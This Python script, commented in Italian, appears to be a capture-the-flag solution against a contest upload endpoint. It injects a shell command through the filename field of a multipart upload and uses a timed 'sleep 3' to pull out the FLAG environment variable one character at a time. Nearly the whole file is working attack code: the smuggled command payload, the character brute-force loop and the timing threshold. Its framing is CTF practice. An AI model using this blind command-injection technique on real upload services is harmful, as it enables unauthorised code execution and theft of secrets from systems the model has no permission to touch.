import requests
import string
import time

"""
L'idea è quella di utilizzare un time-base exflitration technique, poiche non c'è nessun modo per visualizzare l'outpur dei comandi.
Quindi faccio l'echo della variabile di ambiente $FLAG e la passo al comando cut "selezionando" la prima posizione e confrontandola con tutte i caratteri possibili se il confronto ha successo lo posso capire dal fatto che faccio aspettare il server 3s prima di rispondere ,una volta indovinata passo alla lettera alla posizione successiva. in questo modo posso ricavarmi la flag completa
"""




URL = "https://d9f2d107-3d38-4202-8948-e7ed9321ade3.offsec.m0lecon.it/scan"


CHARSET = string.ascii_letters + string.digits + "{}_-"#--> definisco il charset da provare



flag = ""


MAX_LEN = 80# <--lunghezza massima  flag

for pos in range(1, MAX_LEN + 1):

    found = False

    for c in CHARSET:

        payload = (
            f";test $(printf %s $FLAG | cut -c{pos}) = {c} && sleep 3"#<-- faccio un eco della variabile $FLAG ed estraggo solo il carattere interessato, confrontandolo con tutti i caratter nel charset, se è indovinato faccio aspettare il server 3s prima di rispondere. TEST viene usato per il confronto 
    

        )

        files = {#<-- Qui construisco il file fittizio da mandare al server con requests.post, la command injection è presente nel campo "filename"
            "specimen": ( #<-- campo name = Nome del file definito dal server 
                payload,#<-- campo filename = 
                b"aaaa",#<-- contenuto del file 
                "text/plain"#<--Content-Type
            )
        }

        start = time.time()#<-- avvio il timer per vedere i tempi di risposta

       
        requests.post(#<-- invio la richiesta 
                URL,
                files=files,

                timeout=10#<-- aspetto prima di mandare un'altra richiesta
            )
      
        elapsed = time.time() - start

        print(f"pos={pos:02d} char={c} time={elapsed:.2f}")

        # threshold timing
        if elapsed > 2.5:
            flag += c
            print(f"FOUND => {flag}, time={elapsed:.2f}")
            found = True
            break

    if not found:
        print("No matching character found, stopping.")
        break

print(f"\nFINAL FLAG: {flag}")
